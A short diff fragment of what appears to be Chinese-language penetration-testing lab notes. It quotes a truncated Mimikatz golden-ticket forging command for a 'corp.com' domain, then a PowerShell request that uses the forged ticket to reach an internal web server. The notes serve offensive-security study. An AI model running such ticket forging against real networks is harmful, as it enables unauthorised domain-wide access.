@@ -130,6 +130,7 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
 
 
 利用票券瀏覽網頁
+
 ```
 $response = Invoke-WebRequest -Uri "http://web04.corp.com/" -UseDefaultCredentials
 $response.Content
